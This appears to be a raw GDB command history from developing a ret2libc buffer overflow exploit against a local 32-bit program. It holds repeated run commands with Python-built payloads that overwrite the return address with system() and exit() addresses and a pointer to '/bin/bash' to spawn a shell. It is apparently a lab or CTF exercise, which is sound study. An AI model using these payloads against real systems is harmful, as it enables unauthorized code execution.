b func 
run
print system
print exit
x/400s $ebp
x/s 0xffffd1cd + 6
b func
run
 print system
print exit
disass main
b func
b func
run
b main
run aaaaaaaa
x/10xs $ebp
x/50xs $ebp
x/50xs $esp
x/500xs $ebp
run aaaaaaaaaaaaaaa
x/500xs $ebp
run aaaaaaaaaaaaa
x/500xs $ebp
run aaaaaaaaaaaaa
x/500xs $ebp
run aaaaaaaaaaaaaaa
x/500xs $ebp
b func
run ./code4 `python -c "print 'a' * 32 + '\xa0\x1d\xe3\xf7' + '\xd0\x59\xe2\xf7' + 'aaaa' + '/bin/bash'"`
ni
x/10xw $esp
b func
run ./code4 `python -c "print 'a' * 36 + '\xa0\x1d\xe3\xf7' + '\xd0\x59\xe2\xf7' + 'aaaa' + '/bin/bash'"`
ni
x/100xw $esp
disass main
b func
run `python -c "print 'a' * 57 + 'b' * 4"`
ni
x/100xw $esp
disass main
run `python -c "print 'a' * 57 + 'b' * 4"`
x/10xw $esp
disass main
x/10xw $esp
ni
x/80xw $esp
x/80x $esp
x/80xb $esp
ni
x/100xw $esp
print system
print exit
x/500s $esp
run `python -c "print 'a' * 58 + 'b' * 4 + '\xd0\x59\xe2\xf7'"`
ni
x/100xw $esp
ni
x/100xw $esp
ni
x/10xw $esp
ni
run `python -c "print 'a' * 58 + 'b' * 4 +  '\xa0\x1d\xe3\xf7' + '\xd0\x59\xe2\xf7' + 'aaaa'
run `python -c "print 'a' * 58 + 'b' * 4 +  '\xa0\x1d\xe3\xf7' + '\xd0\x59\xe2\xf7' + 'aaaa'
run `python -c "print 'a' * 58 + 'b' * 4 +  '\xa0\x1d\xe3\xf7' + '\xd0\x59\xe2\xf7' + 'aaaa'"`
x/500xs $esp
run `python -c "print 'a' * 58 + 'b' * 4 +  '\xa0\x1d\xe3\xf7' + '\xd0\x59\xe2\xf7' + '\xac\xd1\xff\xff'"`
ni
print system
print exit
 x/500xs $esp
ni
x/100xw $esp
ni
x/100xw $esp
ni
ni
ni
continue
run aaa
run
run aaaaa
run ls
b func
run aaaaaaaaaaaaaaaaa
print system
print exit
x/500s $esp
run aa
print system
print exit
x/500s $esp
run aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
print system
print exit
x/500s $esp
b func
run aa
print system
print exit
x/500s $esp
c/s 0xffffd1a8
x/s 0xffffd1a8
x/s 0xffffd1a8 + 6
x/s 0xffffd90d
x/s 0xffffd90d+20
x/s 0xffffd90d+20+30
x/s 0xffffd90d+20+3
x/s 0xffffd90d+20+15
x/s 0xffffd90d+20+15+3
run `python -c "print 'a' * 58 + 'b' * 4 +  '\xa0\x1d\xe3\xf7' + '\xd0\x59\xe2\xf7' + '\x33\xd9\xff\xff'"`
ni
x/100xw $esp
ni
x/100xw $esp
ni
x/100xw $esp
continue
b func
run aaa
print system
print exit
x/500s $esp
x/s 0xffffd7d7
run `python -c "print 'a' * 58 + 'b' * 4 +  '\xa0\x1d\xe3\xf7' + '\xd0\x59\xe2\xf7' + '\xd7\xd7\xff\xff'"`
ni
x/100xw $esp
ni
x/100xw $esp
ni
x/100xw $esp
continue
b func
run aaaa
print system
print exit
